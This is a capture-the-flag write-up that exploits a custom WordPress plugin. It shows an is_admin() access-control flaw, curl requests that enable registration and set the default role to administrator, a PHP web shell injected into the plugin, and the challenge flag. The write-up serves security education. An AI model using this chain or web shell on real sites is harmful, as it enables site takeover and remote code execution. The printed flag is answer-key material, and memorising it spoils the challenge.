# SilentSnow - CTF Web Challenge Writeup
 
---

## 1. Recon

The challenge provided a Dockerized WordPress instance. Initial analysis of the provided source files (`custom-entrypoint.sh` and `src/`) revealed a custom plugin named **`my-plugin`**.

Inspecting `my-plugin.php` revealed a critical vulnerability in the `admin_page()` function. 

The function used `!is_admin()` for access control, which is flawed because it only checks if the requested URL is an admin page, not if the user is authenticated. 

It allowed unauthenticated users to update arbitrary WordPress options via `$_POST['my_plugin_action']`.

**Vulnerable Code Snippet:**

```php
public function admin_page() {
    // Flawed check: is_admin() returns true for /wp-admin/admin-post.php
    if (!is_admin()) {
        wp_die('Access denied');
    }

    if (isset($_POST['my_plugin_action'])) {
        check_admin_referer("my_plugin_nonce", "my_plugin_nonce");
        // Arbitrary Option Update
        update_option($_POST['my_plugin_action'], sanitize_text_field($_POST['mode']));
        ...
    }
}

```

## 2. Exploitation: Authentication Bypass

To gain access to the system, I chained the **Arbitrary Option Update** vulnerability to enable user registration and escalate privileges.

**Step 1: Retrieve Nonce**
I visited the vulnerable endpoint to leak a valid nonce required for the POST request.

* **URL:** `http://<TARGET_IP>:<PORT>/wp-admin/admin-post.php?settings=1`

Then I viewed the page source

* **Nonce Found:** `fd557c5235` (extracted from page source).

**Step 2: Enable Registration & Escalate Privileges**
Using `curl`, I sent two POST requests to overwrite core WordPress settings:

1. **Enable Registration:** Set `users_can_register` to `1`.
2. **Set Default Role:** Set `default_role` to `administrator`.

```bash
# Enable Registration
curl -X POST "http://<TARGET_IP>:<PORT>/wp-admin/admin-post.php?settings=1" \
     -d "my_plugin_nonce=fd557c5235" \
     -d "my_plugin_action=users_can_register" \
     -d "mode=1"

# Make new users Admins
curl -X POST "http://<TARGET_IP>:<PORT>/wp-admin/admin-post.php?settings=1" \
     -d "my_plugin_nonce=fd557c5235" \
     -d "my_plugin_action=default_role" \
     -d "mode=administrator"
```

**Step 3: Register & Login**
I navigated to `/wp-login.php?action=register`, created a new account, and was immediately logged in as an **Administrator** due to the plugin's auto-login feature.

## 3. Post-Exploitation: Remote Code Execution (RCE)

With Administrator privileges, I gained access to the **Plugin File Editor**. 

It took me a long time to find this hidden "joy" function in the file system so I decided to inject a backdoor directly instead.

**Payload Injection:**
I modified `my-plugin.php` by injecting a simple PHP web shell into the `init()` function:

```php
public function init() {
    // --- START OF BACKDOOR ---
    if (isset($_GET['cmd'])) {
        system($_GET['cmd']);
        exit;
    }
    // --- END OF BACKDOOR ---
    
    if (isset($_GET['settings'])) {
        $this->admin_page();
        exit;
    }
}

```

## 4. Retrieving the Flag

With the backdoor active, I executed system commands directly via the browser URL.

1. **List Root Directory:**
`http://<TARGET_IP>:<PORT>/?cmd=ls /`
* **Result:** The output confirmed the existence of a file named `flag.txt` in the root directory.

2. **Read the Flag:**
`http://<TARGET_IP>:<PORT>/?cmd=cat /flag.txt`
* **Result:** The server returned the flag contents.

**Final Flag:**
`HTB{s1l3nt_snow_b3y0nd_tinselwick_t0wn_d6dc697ff8c5ed6fcad605980cd75ce6}`